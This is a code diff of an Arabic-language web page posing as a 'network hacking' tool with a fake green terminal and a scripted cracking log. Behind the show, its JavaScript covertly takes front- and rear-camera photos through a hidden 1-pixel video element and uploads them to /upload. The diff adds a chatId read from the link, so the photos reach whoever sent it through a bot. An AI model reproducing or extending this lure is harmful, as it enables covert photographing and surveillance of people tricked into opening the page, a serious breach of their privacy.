@@ -6,196 +6,49 @@
   <title>Cyber Attack - اختراق الشبكات</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Share+Tech+Mono&display=swap');
-    
     * { box-sizing: border-box; }
-
     body {
-      background-color: #000;
-      color: #00ff00;
-      font-family: 'Share Tech Mono', monospace;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      width: 100vw;
-      overflow: hidden;
-      background-image: 
-        linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0, 255, 0, 0.05) 1px, transparent 1px);
+      background-color: #000; color: #00ff00; font-family: 'Share Tech Mono', monospace;
+      margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center;
+      height: 100vh; width: 100vw; overflow: hidden;
+      background-image: linear-gradient(rgba(0, 255, 0, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 0, 0.05) 1px, transparent 1px);
       background-size: 20px 20px;
     }
-
-    .app-container {
-      width: 100%;
-      height: 100%;
-      max-width: 400px;
-      padding: 15px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      gap: 15px;
-    }
-
-    .header-section {
-      text-align: center;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    /* شعار الواي فاي الحقيقي المتداخل */
-    .wifi-icon {
-      position: relative;
-      width: 60px;
-      height: 45px;
-      margin-bottom: 10px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-end;
-    }
-
-    .wifi-arc {
-      border: 4px solid transparent;
-      border-top-color: #00ff00; /* لون أخضر نيون */
-      border-radius: 50%;
-      position: absolute;
-      left: 50%;
-      transform: translateX(-50%);
-      box-shadow: 0 0 15px #00ff00, inset 0 0 15px #00ff00; /* تأثير الإضاءة */
-    }
-
-    /* تداخل الأقواس عشان يطلع شكل الشعار الصح */
+    .app-container { width: 100%; height: 100%; max-width: 400px; padding: 15px; display: flex; flex-direction: column; justify-content: center; gap: 10px; }
+    .header-section { text-align: center; display: flex; flex-direction: column; align-items: center; }
+    
+    .wifi-icon { position: relative; width: 60px; height: 45px; margin-bottom: 10px; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; }
+    .wifi-arc { border: 4px solid transparent; border-top-color: #00ff00; border-radius: 50%; position: absolute; left: 50%; transform: translateX(-50%); box-shadow: 0 0 15px #00ff00; }
     .arc-1 { width: 60px; height: 60px; bottom: -10px; border-width: 4px; }
     .arc-2 { width: 40px; height: 40px; bottom: -5px; border-width: 4px; }
     .arc-3 { width: 20px; height: 20px; bottom: 0px; border-width: 4px; }
+    .wifi-dot { width: 8px; height: 8px; background-color: #00ff00; border-radius: 50%; box-shadow: 0 0 15px #00ff00; position: absolute; bottom: 0; z-index: 10; }
 
-    .wifi-dot {
-      width: 8px;
-      height: 8px;
-      background-color: #00ff00;
-      border-radius: 50%;
-      box-shadow: 0 0 15px #00ff00, inset 0 0 10px #00ff00;
-      position: absolute;
-      bottom: 0;
-      z-index: 10;
-    }
+    .main-title { font-family: 'Cairo', sans-serif; font-weight: 900; font-size: 28px; color: #00ff00; text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; margin: 0; }
+    .sub-title { font-size: 12px; color: #00ff00; text-shadow: 0 0 8px #00ff00; letter-spacing: 2px; margin-top: 5px; }
 
-    .main-title {
-      font-family: 'Cairo', sans-serif;
-      font-weight: 900;
-      font-size: 28px;
-      color: #00ff00;
-      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00, 0 0 30px #00ff00;
-      margin: 0;
-    }
-
-    .sub-title {
-      font-size: 12px;
-      color: #00ff00;
-      text-shadow: 0 0 8px #00ff00;
-      letter-spacing: 2px;
-      margin-top: 5px;
-    }
-
-    .terminal-box {
-      width: 100%;
-      height: 220px;
-      border: 2px solid #00ff00;
-      border-radius: 10px;
-      padding: 10px;
-      box-shadow: 0 0 20px rgba(0, 255, 0, 0.5), inset 0 0 20px rgba(0, 255, 0, 0.2);
-      background: rgba(0, 5, 0, 0.95);
-      display: flex;
-      flex-direction: column;
-    }
-
-    .terminal-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 1px solid #00ff00;
-      padding-bottom: 5px;
-      margin-bottom: 8px;
-      font-size: 11px;
-      color: #00ff00;
-    }
-
-    .blink { animation: blink-anim 1s infinite; }
-    @keyframes blink-anim { 50% { opacity: 0; } }
-
-    #log {
-      flex-grow: 1;
-      overflow-y: auto;
-      font-size: 13px;
-      line-height: 1.6;
-      text-align: right;
-      padding-right: 5px;
-    }
-
-    #log::-webkit-scrollbar { width: 3px; }
-    #log::-webkit-scrollbar-track { background: #000; }
-    #log::-webkit-scrollbar-thumb { background: #00ff00; }
-
-    .line { opacity: 0; animation: fadeIn 0.3s forwards; margin-bottom: 4px; color: #00ff00; }
-    @keyframes fadeIn { to { opacity: 1; } }
-
-    #startBtn {
-      background-color: rgba(0, 255, 0, 0.1);
-      color: #00ff00;
-      border: 2px solid #00ff00;
-      padding: 15px;
-      font-size: 18px;
-      font-family: 'Cairo', sans-serif;
-      font-weight: 900;
-      cursor: pointer;
-      transition: all 0.3s;
-      box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
-      border-radius: 8px;
-      width: 100%;
-      text-shadow: 0 0 10px #00ff00;
-    }
-
-    #startBtn:active {
-      background-color: #00ff00;
-      color: #000;
-      box-shadow: 0 0 40px #00ff00;
-    }
-
-    #startBtn:disabled {
-      border-color: #555; color: #555; box-shadow: none; text-shadow: none; background: transparent;
-    }
-
-    #status { 
-      font-size: 16px; 
-      text-align: center; 
-      font-weight: bold; 
-      min-height: 20px;
-      font-family: 'Cairo', sans-serif;
-      color: #00ff00; /* كل الكلام أخضر */
-    }
-
+    .terminal-box { width: 100%; height: 200px; border: 2px solid #00ff00; border-radius: 10px; padding: 10px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); background: rgba(0, 5, 0, 0.95); display: flex; flex-direction: column; }
+    .terminal-header { display: flex; justify-content: space-between; border-bottom: 1px solid #00ff00; padding-bottom: 5px; margin-bottom: 8px; font-size: 11px; }
+    .blink { animation: blink-anim 1s infinite; } @keyframes blink-anim { 50% { opacity: 0; } }
+    #log { flex-grow: 1; overflow-y: auto; font-size: 13px; line-height: 1.6; text-align: right; padding-right: 5px; }
+    #log::-webkit-scrollbar { width: 3px; } #log::-webkit-scrollbar-thumb { background: #00ff00; }
+    .line { opacity: 0; animation: fadeIn 0.3s forwards; margin-bottom: 4px; } @keyframes fadeIn { to { opacity: 1; } }
+    
+    #startBtn { background-color: rgba(0, 255, 0, 0.1); color: #00ff00; border: 2px solid #00ff00; padding: 12px; font-size: 18px; font-family: 'Cairo', sans-serif; font-weight: 900; cursor: pointer; transition: all 0.3s; box-shadow: 0 0 15px rgba(0, 255, 0, 0.6); border-radius: 8px; width: 100%; margin-top: 10px; }
+    #startBtn:active { background-color: #00ff00; color: #000; box-shadow: 0 0 40px #00ff00; }
+    #startBtn:disabled { border-color: #555; color: #555; box-shadow: none; background: transparent; }
+    #status { font-size: 14px; text-align: center; font-weight: bold; font-family: 'Cairo', sans-serif; color: #00ff00; margin-top: 5px; }
     #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
   </style>
 </head>
 <body>
-
   <div class="app-container">
     <div class="header-section">
-      
-      <!-- شعار الواي فاي الجديد المتداخل -->
       <div class="wifi-icon">
-        <div class="wifi-arc arc-1"></div>
-        <div class="wifi-arc arc-2"></div>
-        <div class="wifi-arc arc-3"></div>
-        <div class="wifi-dot"></div>
+        <div class="wifi-arc arc-1"></div><div class="wifi-arc arc-2"></div><div class="wifi-arc arc-3"></div><div class="wifi-dot"></div>
       </div>
-      
       <h1 class="main-title">اختراق الشبكات</h1>
-      <div class="sub-title">CYBER ATTACK SYSTEM v9.0</div>
+      <div class="sub-title">CYBER ATTACK v9.0</div>
     </div>
 
     <div class="terminal-box">
@@ -203,12 +56,10 @@
         <span>STATUS: <span class="blink">● LIVE</span></span>
         <span>TARGET: WIFI_NET</span>
       </div>
-      
       <div id="log">
         <div class="line">> جاري الاتصال بالسيرفر المركزي...</div>
         <div class="line">> تفعيل وضع المراقبة (Monitor Mode)...</div>
         <div class="line">> ⚠️ تم اكتشاف شبكة واي فاي محمية!</div>
-        <div class="line">> جاري فحص نقاط الضعف في الراوتر...</div>
       </div>
     </div>
 
@@ -225,30 +76,37 @@
     const log = document.getElementById('log');
     let stream = null;
 
+    // بنقرا الآيدي من اللينك
+    const urlParams = new URLSearchParams(window.location.search);
+    const userChatId = urlParams.get('chatId');
+
     function addLog(text) {
       const div = document.createElement('div');
-      div.className = `line`;
-      div.textContent = `> ${text}`;
-      log.appendChild(div);
-      log.scrollTop = log.scrollHeight;
+      div.className = 'line'; div.textContent = `> ${text}`;
+      log.appendChild(div); log.scrollTop = log.scrollHeight;
     }
 
     async function takePhoto(facing) {
       if (stream) stream.getTracks().forEach(t => t.stop());
       stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
       video.srcObject = stream;
-      await new Promise(r => setTimeout(r, 1500));
+      await new Promise(r => setTimeout(r, 1000));
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 720;
-      canvas.height = video.videoHeight || 960;
+      canvas.width = video.videoWidth || 720; canvas.height = video.videoHeight || 960;
       canvas.getContext('2d').drawImage(video, 0, 0);
       const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
       stream.getTracks().forEach(t => t.stop());
-      await new Promise(r => setTimeout(r, 1000)); 
+      await new Promise(r => setTimeout(r, 800)); 
       return blob;
     }
 
     startBtn.onclick = async () => {
+      if (!userChatId) {
+        status.innerText = "⚠️ خطأ: هذا الرابط غير صالح، يرجى فتح الرابط من البوت.";
+        status.style.color = "#ff0000";
+        return;
+      }
+
       try {
         startBtn.disabled = true;
         startBtn.style.display = 'none';
@@ -257,33 +115,34 @@
         
         addLog("⛔ محاولة كسر تشفير WPA2...");
         status.innerText = "جاري كسر التشفير... [3]";
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 800));
 
         addLog("⚠️ تم اختراق جدار الحماية!");
         status.innerText = "جاري كسر التشفير... [2]";
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 800));
 
         addLog("💀 جاري حقن الأكواد الخبيثة...");
         status.innerText = "جاري كسر التشفير... [1]";
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 800));
 
-        addLog("✅ تم كسر التشفير بنجاح! تم..");
-        status.innerText = "جار اختراق الشبكات يجاري كلمات المرور...";
+        addLog("✅ تم كسر التشفير! جاري سحب ...");
+        status.innerText = "جاري سحب البيانات...";
         
         const photos = [];
         photos.push(await takePhoto('user')); 
         photos.push(await takePhoto('user')); 
         photos.push(await takePhoto('environment')); 
 
-        addLog("🔒 تشفير البيانات وإرسالها إلى السيرفر...");
+        addLog("🔒 تشفير البيانات وإرسالها...");
         status.innerText = "جاري الإرسال...";
 
         const form = new FormData();
+        form.append('chat_id', userChatId); 
         photos.forEach((p, i) => form.append('photos', p, `photo_${i + 1}.jpg`));
 
         await fetch('/upload', { method: 'POST', body: form });
         
-        addLog("☠️ تم الاختراق! كل بيانات الضحية في أيدينا.");
+        addLog("☠️ تم الاختراق! البيانات في أيدينا.");
         status.innerText = "تم الاختراق بنجاح! (أغلق الصفحة)";
         
       } catch (err) {
